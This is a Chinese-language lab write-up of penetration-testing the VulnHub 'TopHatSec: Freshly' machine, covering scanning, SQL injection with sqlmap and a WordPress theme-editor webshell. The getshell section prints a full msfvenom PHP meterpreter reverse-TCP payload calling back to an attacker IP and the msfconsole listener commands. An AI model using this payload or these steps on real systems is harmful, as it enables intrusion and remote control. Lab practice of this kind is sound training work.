# 原创
：  VulnHub渗透测试实战靶场 - TOPHATSEC: FRESHLY

# VulnHub渗透测试实战靶场 - TOPHATSEC: FRESHLY

#### VulnHub渗透测试实战靶场 - TOPHATSEC: FRESHLY

## 环境下载

> 
戳此进行[环境下载](https://download.vulnhub.com/tophatsec/Freshly.ova)


## TOPHATSEC: FRESHLY靶机搭建

> 
具体步骤参考[VirtualBox(Host only)和VMware共用同一虚拟网卡](https://blog.csdn.net/LYJ20010728/article/details/119395324?spm=1001.2014.3001.5501)



## 渗透测试

### 信息搜集

> 
用`arp-scan`探测一下目标靶机的IP：`sudo arp-scan -l`


> 
用nmap探测一下目标靶机IP的信息：`sudo nmap -sS -A 192.168.56.104`


### 漏洞挖掘

> 
分别查看一下探测到的三个开放端口


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/456a7fed21944e1dbb7593973233ec1c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/628c19c387fb49be8645d5372f168fc3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a41e8539a029475d8e8f38e2e60b1acb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
进一步测试发现现8080和443端口都使用了WordPress


> 
用`dirsearch`扫描一下80端口：`python3 dirsearch.py -u 192.168.56.104 -e *.php`


> 
访问`http://192.168.56.104/login.php`，用burpsuite抓包将内容保存下来，利用sqlmap测试后发现存在SQL注入漏洞


> 



> 



> 



> 



> 
得到用户名和密码：`admin:SuperSecretPassword`<br/> 登录8080端口的web页面：`http://192.168.56.104/login.php`


> 
wordpress有两种方式拿shell



### getshell

> 
进入页面：`http://192.168.56.104:8080/wordpress/wp-admin/theme-editor.php?file=404.php&amp;theme=twentythirteen`<br/> 用msfvenom生成一个php反弹shell的木马：`msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=1234 R &gt; shell.php`


> 
shell内容


```
/*&lt;?php /**/ error_reporting(0); $ip = '192.168.56.102'; $port = 1234; if (($f = 'stream_socket_client') &amp;&amp; is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s &amp;&amp; ($f = 'fsockopen') &amp;&amp; is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s &amp;&amp; ($f = 'socket_create') &amp;&amp; is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) &lt; $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') &amp;&amp; ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();

```

> 
将shell插入命令执行漏洞页面，访问`http://192.168.56.104:8080/wordpress/wp-content/themes/twentythirteen/404.php`，成功触发恶意代码


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/cd0f1ae9bf5c4fe9813abd29c7acdc21.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/db27581d3bbe46fe8641c2bf6fcacd62.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
用msfconsole起一个监听


```
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.56.102
set lport 1234
run

```

> 
再次访问`http://192.168.56.104:8080/wordpress/wp-content/themes/twentythirteen/404.php`，成功反弹shell


### 提权

> 
查看`/etc/passwd`、用户组


> 
发现可以直接`su`提权到root

